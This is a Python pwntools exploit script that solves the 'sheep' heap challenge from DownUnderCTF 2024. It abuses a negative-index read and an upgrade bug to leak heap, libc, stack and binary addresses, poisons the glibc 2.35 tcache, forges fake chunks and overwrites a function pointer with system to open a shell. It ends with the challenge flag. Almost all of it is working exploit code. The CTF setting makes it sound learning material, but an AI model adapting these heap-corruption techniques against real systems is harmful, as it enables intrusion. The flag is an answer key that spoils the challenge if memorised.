#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'sheep', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
# tbreak main
# b view_sheep
# dir ./glibc-2.35
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or '2024.ductf.dev'
    port = int(args.PORT or 30025)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def buy_sheep(type):
    sla(b'> ', f'1 {type}'.encode())
    ru(b'sheep bought, sitting at index: ', drop=True)
    idx = rl().decode().strip()
    # print_wool()
    return int(idx)

def upgrade_sheep(idx, type):
    sla(b'> ', f'2 {idx} {type}'.encode())
    # print_wool()

def sell_sheep(idx):
    sla(b'> ', f'3 {idx}'.encode())

def view_sheep(idx):
    sla(b'> ', f'4 {idx}'.encode())

def make_money(n):
    sla(b'> ', '5 '.encode() * n)
    
    
def addr2ops(addr, starting_val=0):
    ops = []
    while addr:
        if addr == starting_val: break
        
        if addr % 2:
            ops.append(1)
            addr -= 1
            
        if not addr: break
        ops.append(2)
        
        addr /= 2

    return list(reversed(ops))


def print_wool():
    ru(b'Wool: ', drop=True)
    w = int(rl().decode())
    info(w)
    return w


buy_sheep(0)
make_money(100)
make_money(100)
make_money(100)
sell_sheep(0)

info('leak heap')
view_sheep((-0x230//8)+1)

ru(b'WPS: ', drop=True)
heap_leak = rl()
heap_leak = int(heap_leak.decode())
curr_addr = heap_leak
heap_base = heap_leak << 12
info(f'heap_leak: {heap_base:#x}')

heap = lambda o: heap_base + o


info('generate money and prepare heap layout')
buy_sheep(0)
buy_sheep(0)
buy_sheep(0)
buy_sheep(0)

make_money(40)
sell_sheep(1)
sell_sheep(0)


info('clear next ptr')
for _ in range(64):
    upgrade_sheep((-0x230//8)+1, 2)


info('set next ptr')
mangled = protect_ptr(heap(0x360), heap(0x340))
for op in addr2ops(mangled):
    upgrade_sheep((-0x230//8)+1, op)


info('consume poisoned tcache node')
buy_sheep(0)
poisoned = buy_sheep(0)

info('now set sheep->wps to the beginning of heap')
for op in addr2ops(heap(0), 1):
    upgrade_sheep(poisoned, op)

# our new sheep is on idx=17
new_sheep = 17


# heap base
# 0x586b6b96e000	0x0000000000000000	0x0000000000000291	................
# 0x586b6b96e010	0x0000000000000000	0x0000000000000000	................
# 0x586b6b96e020	0x0000000000000000	0x0000000000000000	................

#                      new sheep
# 0x586b6b96e340	0x0000586b6b96e000	0x00000000000003e7	...kkX..........
# 0x586b6b96e350	0x0000000000000001	0x0000000000000021	........!.......
# 0x586b6b96e360	0x0000000000000001	0x0000000000000000	................

info('increase sheep value a bit, to set chunk size more than 0x441')
upgrade_sheep(new_sheep, 64)


# now ensure that free could be safely done and we can avoid the following check
# if (__glibc_unlikely (!prev_inuse(nextchunk)))
#   malloc_printerr ("double free or corruption (!prev)");

def set_new_sheep(to_addr):
    # zero out new_sheep
    for _ in range(64):
        upgrade_sheep(poisoned, 2)

    for op in addr2ops(to_addr):
        upgrade_sheep(poisoned, op)


def set_new_seep_val(v):
    for _ in range(64):
        upgrade_sheep(new_sheep, 2)

    for op in addr2ops(v):
        upgrade_sheep(new_sheep, op)
    

info('set size for fake chunk')
set_new_sheep(heap(0x4d8))
set_new_seep_val(0x21)


info('set size for fake chunk -> next')
set_new_sheep(heap(0x4d8+0x20))
set_new_seep_val(0x21)


# 0x5e4290d284c0	0x0000000000000000	0x0000000000000000	................
# 0x5e4290d284d0	0x0000000000000000	0x0000000000000021	........!.......
# 0x5e4290d284e0	0x000000000000006c	0x0000000000000000	l...............
# 0x5e4290d284f0	0x0000000000000000	0x0000000000000021	........!.......
# 0x5e4290d28500	0x000000000000006c	0x0000000000000000	l...............

set_new_sheep(heap(0x10))
sell_sheep(new_sheep)


# 0x5e4290d28000	0x0000000000000000	0x00000000000004d1	................	 <-- unsortedbin[all][0]
# 0x5e4290d28010	0x000076e33a01ace0	0x000076e33a01ace0	...:.v.....:.v..
# 0x5e4290d28020	0x0000000000000000	0x0000000000000000	................
# 0x5e4290d28030	0x0000000000000000	0x0000000000000000	................


set_new_sheep(heap(0x10))
view_sheep(new_sheep)

ru(b'WPS: ', drop=True)
libc_leak = rl()
libc_leak = int(libc_leak.decode())
info(f'libc_leak: {libc_leak:#x}')

libc_base = libc_leak -0x21ace0
libc.address = libc_base
info(f'libc_base: {libc_base:#x}')


set_new_sheep(libc.sym.environ)
view_sheep(new_sheep)
ru(b'WPS: ', drop=True)
stack_leak = rl()
stack_leak = int(stack_leak.decode())
info(f'stack_leak: {stack_leak:#x}')


set_new_sheep(stack_leak-0x30)
view_sheep(new_sheep)
ru(b'WPS: ', drop=True)
pie_leak = rl()
pie_leak = int(pie_leak.decode())
info(f'pie_leak: {pie_leak:#x}')

exe.address = pie_leak-0x1185
info(f'exe.address: {exe.address:#x}')


info('set hidden ability on index 0xc')
set_new_sheep(exe.sym.abilities+0x60)
set_new_seep_val(libc.sym.system)

info('preparing /bin/sh chunk')
set_new_sheep(heap(0x460))
set_new_seep_val(u32(b'sh\x00\x00'))

set_new_sheep(heap(0x460+0x10))
set_new_seep_val(0xc)

# set 4th chunk
set_new_sheep(heap(0x2d0))
set_new_seep_val(heap(0x460))


info('fix heap :)')
set_new_sheep(heap(0x10))
set_new_seep_val(1) # tcache[0x20] cnt

set_new_sheep(heap(0x18))
set_new_seep_val(0)

# set tache[0x20] ptr
set_new_sheep(heap(0x90))
set_new_seep_val(heap(0x4a0))

# trigger system('sh')
buy_sheep(0)

ia()


# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.6) stable release version 2.35.

# bugs
# missing return in upgrade_sheep
# read_int negative idx

# DUCTF{y0u_ar3_the_gre4t3st_sheph3rd!!}
